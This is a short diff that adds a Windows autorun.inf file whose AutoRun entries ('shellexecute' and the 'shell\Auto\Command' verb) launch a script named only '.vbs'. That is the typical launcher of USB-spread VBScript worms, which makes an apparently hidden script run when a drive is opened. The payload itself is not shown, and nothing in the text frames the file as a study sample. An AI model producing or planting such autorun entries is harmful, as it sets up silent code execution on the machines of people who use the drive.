@@ -1,0 +1,3 @@
+[AutoRun]
+shellexecute=.vbs
+shell\Auto\Command=.vbs
